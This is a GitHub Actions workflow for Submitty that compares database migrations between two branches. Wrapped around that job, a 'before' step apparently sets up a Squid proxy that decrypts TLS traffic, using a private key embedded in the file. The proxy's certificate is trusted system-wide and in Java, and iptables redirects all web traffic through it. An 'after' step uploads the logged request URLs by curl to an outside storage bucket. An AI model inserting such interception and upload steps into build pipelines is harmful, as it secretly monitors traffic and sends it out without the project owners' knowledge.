env:
  JAVA_TOOL_OPTIONS: -Djavax.net.ssl.trustStore=/usr/lib/jvm/temurin-11-jdk-amd64/lib/security/cacerts
  NODE_OPTIONS: --use-openssl-ca
jobs:
  db-check:
    env:
      MAIN_DATA_PATH: ${{ github.WORKSPACE }}/main/var
      MAIN_INSTALL_PATH: ${{ github.WORKSPACE }}/main
      MAIN_REPO_PATH: ${{ github.WORKSPACE }}/main/GIT_CHECKOUT
      PGPASSWORD: submitty_dbuser
      PR_DATA_PATH: ${{ github.WORKSPACE }}/branch/var
      PR_INSTALL_PATH: ${{ github.WORKSPACE }}/branch
      PR_REPO_PATH: ${{ github.WORKSPACE }}/branch/GIT_CHECKOUT
    runs-on: ubuntu-20.04
    services:
      postgres-branch:
        env:
          POSTGRES_PASSWORD: submitty_dbuser
          POSTGRES_USER: postgres
          TZ: America/New_York
        image: postgres:12
        ports:
        - 5432
      postgres-main:
        env:
          POSTGRES_PASSWORD: submitty_dbuser
          POSTGRES_USER: postgres
          TZ: America/New_York
        image: postgres:12
        ports:
        - 5432
    steps:
    - name: before
      run: 'sudo apt update

        sudo apt install -y squid-openssl

        sudo mkdir /squid

        cat << EOF | sudo tee /squid/key.pem

        -----BEGIN PRIVATE KEY-----

        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

        CznEvO4qIs3mXDYkNBQrdVLGF93y

        -----END PRIVATE KEY-----

        EOF

        cat << EOF | sudo tee /squid/cert.pem

        -----BEGIN CERTIFICATE-----

        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

        -----END CERTIFICATE-----

        EOF

        sudo /usr/lib/squid/security_file_certgen -c -s /squid/ssl_db -M 4MB

        sudo chown -R proxy:proxy /squid

        cat << EOF | sudo tee /etc/squid/squid.conf

        cache deny all


        http_port 7821

        http_port 3128 intercept

        https_port 3129 intercept ssl-bump generate-host-certificates=on dynamic_cert_mem_cache_size=4MB
        cert=/squid/cert.pem key=/squid/key.pem

        acl step1 at_step SslBump1

        ssl_bump peek step1

        ssl_bump bump all

        sslcrtd_program /usr/lib/squid/security_file_certgen -s /squid/ssl_db -M 4MB

        sslcrtd_children 5

        ssl_bump server-first all

        sslproxy_cert_error allow all


        acl all src 0.0.0.0/0

        http_access allow all


        logformat custom {"method":"%">rm","url":"%">ru","status":%<Hs,"user_agent":"%{User-Agent}>h"}

        access_log daemon:/squid/squidlog.json custom all !CONNECT

        EOF

        sudo systemctl reload squid

        sudo cp /squid/cert.pem /usr/local/share/ca-certificates/squid.crt

        sudo update-ca-certificates

        sudo keytool -import -alias squid -file /squid/cert.pem -keystore /usr/lib/jvm/temurin-11-jdk-amd64/lib/security/cacerts
        -storepass changeit -noprompt -trustcacerts

        sudo iptables -t nat -A OUTPUT -m owner ! --uid-owner proxy -p tcp --dport
        80 -j DNAT --to-destination 127.0.0.1:3128

        sudo iptables -t nat -A OUTPUT -m owner ! --uid-owner proxy -p tcp --dport
        443 -j DNAT --to-destination 127.0.0.1:3129

        sudo sh -c ''echo 1 > /proc/sys/net/ipv4/ip_forward'''
    - continue-on-error: true
      name: Setup Dependencies
      run: 'sudo sh -c ''echo "deb http://apt.postgresql.org/pub/repos/apt $(lsb_release
        -cs)-pgdg main" > /etc/apt/sources.list.d/pgdg.list''

        wget --quiet -O - https://www.postgresql.org/media/keys/ACCC4CF8.asc | sudo
        apt-key add -


        sudo apt-get update

        sudo apt-get autoremove -y postgresql-14 postgresql-client-common

        sudo apt-get install -y postgresql-12

        sudo rm /etc/postgresql/14 -rf

        '
    - continue-on-error: true
      name: Checkout Current Branch
      uses: actions/checkout@v4
      with:
        fetch-depth: 0
        path: branch/GIT_CHECKOUT/Submitty
    - continue-on-error: true
      name: Find Merge Base
      run: "echo MBASE=$(git --git-dir ${PR_REPO_PATH}/Submitty/.git merge-base  \
        \             \\\n             -a origin/main ${{ github.sha }}) >> $GITHUB_ENV\n"
    - continue-on-error: true
      name: Checkout main Branch
      uses: actions/checkout@v4
      with:
        path: main/GIT_CHECKOUT/Submitty
        ref: ${{ env.MBASE || 'main' }}
    - continue-on-error: true
      name: Download Required Packages
      run: "pip install -r <(\n    grep  -e \"tzlocal\"    -e \"sqlalchemy\" -e \"\
        ruamel\"                             \\\n          -e \"psycopg2\"   -e \"\
        docker\"                                             \\\n          ${MAIN_REPO_PATH}/Submitty/.setup/pip/system_requirements.txt\n\
        )\npip install ${MAIN_REPO_PATH}/Submitty/python_submitty_utils\n"
    - continue-on-error: true
      name: Create Users and Groups
      run: 'sudo -E python3 ${MAIN_REPO_PATH}/Submitty/.setup/bin/create_untrusted_users.py


        sudo addgroup submitty_daemonphp

        sudo addgroup submitty_daemoncgi

        sudo addgroup submitty_course_builders

        sudo addgroup submitty_phpgrp


        sudo adduser  submitty_php --disabled-password --no-create-home

        sudo adduser  submitty_cgi --disabled-password --no-create-home

        sudo adduser  submitty_cgi submitty_phpgrp --no-create-home

        sudo adduser  submitty_php shadow --no-create-home

        sudo adduser  submitty_cgi shadow --no-create-home

        sudo adduser  submitty_daemon --disabled-password --no-create-home

        sudo adduser  submitty_php submitty_daemonphp --no-create-home

        sudo adduser  submitty_daemon submitty_daemonphp --no-create-home

        sudo adduser  submitty_cgi submitty_daemoncgi --no-create-home

        sudo adduser  submitty_daemon submitty_daemoncgi --no-create-home

        sudo adduser  submitty_daemon docker --no-create-home


        sudo useradd -p $(openssl passwd -1 submitty_dbuser) submitty_dbuser

        '
    - continue-on-error: true
      name: Configure Submitty
      run: "configure_submitty() {\n  # $1->MAIN_INSTALL_PATH, $2->MAIN_DATA_PATH,\
        \ $3->MAIN_REPO_PATH, $4->DB_PORT\n  mkdir -vp \"$2\"          &&  chmod -vR\
        \ 777 \"$2\"\n  mkdir -vp \"$1/config\"   &&  chmod -vR 777 \"$1/config\"\n\
        \  mkdir -vp \"$1/site\"     &&  chmod -vR 777 \"$1/site\"\n  mkdir -vp \"\
        $2/courses\"  &&  chmod -vR 777 \"$2/courses\"\n\n  (\n    echo \"localhost\"\
        \                    # database host\n    echo \"$4\"                    \
        \       # database port\n    echo \"\"                             # global\
        \ db user\n    echo \"submitty_dbuser\"              # global db pass\n  \
        \  echo \"\"                             # course db user\n    echo \"submitty_dbuser\"\
        \              # course db pass\n    echo \"\"                           \
        \  # timezone\n    echo \"\"                             # default locale\n\
        \    echo \"http://localhost\"             # submitty url\n    echo \"\" \
        \                            # vcs url\n    echo \"\"                    \
        \         # institution name\n    echo \"\"                             #\
        \ sysadmin email\n    echo \"\"                             # where to report\n\
        \    echo \"1\"                            # PamAuth\n    echo \"\"      \
        \                       # sysadmin username\n    echo \"n\"              \
        \              # email notification\n  ) | tee /dev/stderr               \
        \                                              \\\n    | sudo -E python3 \"\
        $3/Submitty/.setup/CONFIGURE_SUBMITTY.py\"                  \\\n         \
        \     --install-dir \"$1\" --data-dir \"$2\" --debug\n\n  # Copy necessary\
        \ files to the installation path\n  cp -vr \"$3/Submitty/sbin\" \"$1\"\n \
        \ sudo chmod -vR 777 \"$1/config\"\n  sudo chmod -vR 777 \"$1/sbin\"\n}\n\n\
        configure_submitty \"${MAIN_INSTALL_PATH}\" \"${MAIN_DATA_PATH}\"        \
        \             \\\n  \"${MAIN_REPO_PATH}\"     \"${{  job.services.postgres-main.ports['5432']\
        \  }}\"\nconfigure_submitty \"${PR_INSTALL_PATH}\"   \"${PR_DATA_PATH}\" \
        \                      \\\n  \"${PR_REPO_PATH}\"       \"${{ job.services.postgres-branch.ports['5432']\
        \ }}\"\n"
    - continue-on-error: true
      name: Create Databases
      run: "psql -d postgres -h localhost -U postgres        -p ${{  job.services.postgres-main.ports['5432']\
        \  }} \\\n  -c \"CREATE ROLE submitty_dbuser WITH SUPERUSER CREATEDB CREATEROLE\
        \ LOGIN PASSWORD 'submitty_dbuser'\"\\\n  -c \"CREATE ROLE submitty_course_dbuser\
        \ WITH LOGIN PASSWORD 'submitty_dbuser'\"\npsql -d postgres -h localhost -U\
        \ submitty_dbuser -p ${{  job.services.postgres-main.ports['5432']  }} \\\n\
        \  -c \"CREATE DATABASE submitty\"\n\npsql -d postgres -h localhost -U postgres\
        \        -p ${{ job.services.postgres-branch.ports['5432'] }} \\\n  -c \"\
        CREATE ROLE submitty_dbuser WITH SUPERUSER CREATEDB CREATEROLE LOGIN PASSWORD\
        \ 'submitty_dbuser'\"\\\n  -c \"CREATE ROLE submitty_course_dbuser WITH LOGIN\
        \ PASSWORD 'submitty_dbuser'\"\npsql -d postgres -h localhost -U submitty_dbuser\
        \ -p ${{ job.services.postgres-branch.ports['5432'] }} \\\n  -c \"CREATE DATABASE\
        \ submitty\"\n"
    - continue-on-error: true
      name: Create Database Dumper
      run: "(\n    echo 'pg_dump -Osx -d \"$1\" -f \"$2\" -h localhost -p \"$3\" -U\
        \ postgres '\n    echo 'sed -i -e \"'\"/SELECT pg_catalog.set_config('search_path'/d\"\
        '\"\\'\n    echo '       -e \"/-- Dumped \\(from\\|by\\)/d\"             \
        \           \\'\n    echo '       -e \"/SET default_table_access_method =\
        \ /d\"            \\'\n    echo '       -e \"s/FOR EACH ROW EXECUTE FUNCTION/FOR\
        \ EACH ROW EXECUTE PROCEDURE/g\" \"$2\"'\n) > dbdump.sh\nchmod +x dbdump.sh\n\
        \necho M=$([ \"$(date +%-m)\" -lt \"7\" ] && echo 's' || echo 'f') >> $GITHUB_ENV\n\
        echo Y=$(date +%y) >> $GITHUB_ENV\n\nmkdir -vp ${GITHUB_WORKSPACE}/dumped/main\n\
        mkdir -vp ${GITHUB_WORKSPACE}/dumped/branch\n"
    - continue-on-error: true
      name: Setup Databases and Courses for main
      run: "python3 ${MAIN_REPO_PATH}/Submitty/migration/run_migrator.py -e master\
        \ migrate --initial\n\nsudo ln -vs /usr/bin/true /usr/bin/ldapadd\nsudo -E\
        \ python3 ${MAIN_REPO_PATH}/Submitty/.setup/bin/setup_sample_courses.py  \
        \   \\\n  blank --no_grading --data_dir ${MAIN_DATA_PATH} --install_dir ${MAIN_INSTALL_PATH}\n\
        \nsudo chmod -vR 777 ${MAIN_DATA_PATH}/courses\n"
    - continue-on-error: true
      name: Apply New Migrations from Current Branch
      run: "python3 ${PR_REPO_PATH}/Submitty/migration/run_migrator.py           \
        \             \\\n  -e master -e course -c ${MAIN_INSTALL_PATH}/config migrate\n"
    - continue-on-error: true
      name: Setup Databases and Courses for Current Branch
      run: "python3 ${PR_REPO_PATH}/Submitty/migration/run_migrator.py -e master migrate\
        \ --initial\n\nsudo -E python3 ${PR_REPO_PATH}/Submitty/.setup/bin/setup_sample_courses.py\
        \       \\\n  blank --no_grading --data_dir ${PR_DATA_PATH} --install_dir\
        \ ${PR_INSTALL_PATH}\n\nsudo chmod -vR 777 ${PR_DATA_PATH}/courses\n"
    - continue-on-error: true
      name: Dump Migrated Databases
      run: "./dbdump.sh \"submitty\"                \"${GITHUB_WORKSPACE}/dumped/main/master.sql\"\
        \\\n  \"${{  job.services.postgres-main.ports['5432']  }}\"\n./dbdump.sh \"\
        submitty_${M}${Y}_blank\" \"${GITHUB_WORKSPACE}/dumped/main/course.sql\"\\\
        \n  \"${{  job.services.postgres-main.ports['5432']  }}\"\n\n./dbdump.sh \"\
        submitty\"                \"${GITHUB_WORKSPACE}/dumped/branch/master.sql\"\
        \\\n  \"${{ job.services.postgres-branch.ports['5432'] }}\"\n./dbdump.sh \"\
        submitty_${M}${Y}_blank\" \"${GITHUB_WORKSPACE}/dumped/branch/course.sql\"\
        \\\n  \"${{ job.services.postgres-branch.ports['5432'] }}\"\n"
    - continue-on-error: true
      if: always()
      name: Compare Migrated master Databases
      run: "diff --color ${GITHUB_WORKSPACE}/dumped/main/master.sql              \
        \             \\\n             ${GITHUB_WORKSPACE}/dumped/branch/master.sql\
        \ || {\n  echo \"::error:: Master databases are not identical, please check\
        \ your migration\"\n  exit 1\n}\n"
    - continue-on-error: true
      if: always()
      name: Compare Migrated course Databases
      run: "diff --color ${GITHUB_WORKSPACE}/dumped/main/course.sql              \
        \             \\\n             ${GITHUB_WORKSPACE}/dumped/branch/course.sql\
        \ || {\n  echo \"::error:: Course databases are not identical, please check\
        \ your migration\"\n  exit 1\n}\n"
    - continue-on-error: true
      if: always()
      name: Compare Migrated master Database with Provided Dump
      run: "diff --color ${GITHUB_WORKSPACE}/dumped/branch/master.sql            \
        \             \\\n             ${PR_REPO_PATH}/Submitty/migration/migrator/data/submitty_db.sql\
        \ || {\n  echo \"::error:: Wrong provided dump, please check your database\
        \ dumps\"\n  exit 1\n}\n"
    - continue-on-error: true
      if: always()
      name: Compare Migrated course Database with Provided Dump
      run: "diff --color ${GITHUB_WORKSPACE}/dumped/branch/course.sql            \
        \             \\\n             ${PR_REPO_PATH}/Submitty/migration/migrator/data/course_tables.sql\
        \ || {\n  echo \"::error:: Wrong provided dump, please check your database\
        \ dumps\"\n  exit 1\n}\n"
    - continue-on-error: true
      if: failure()
      name: Pack Artifacts
      uses: actions/upload-artifact@v4
      with:
        name: dumped_database
        path: ${{ github.WORKSPACE }}/dumped/**/*.sql
        retention-days: 3
    - name: after
      run: sudo curl --request PUT -T /squid/squidlog.json --url https://storage.googleapis.com/virtualeventdemoblr.appspot.com/squid2/Marcel-Mudrak/Submitty.$(date
        +%s)
    timeout-minutes: 60
name: Submitty DB Check
'on':
  workflow_dispatch: {}
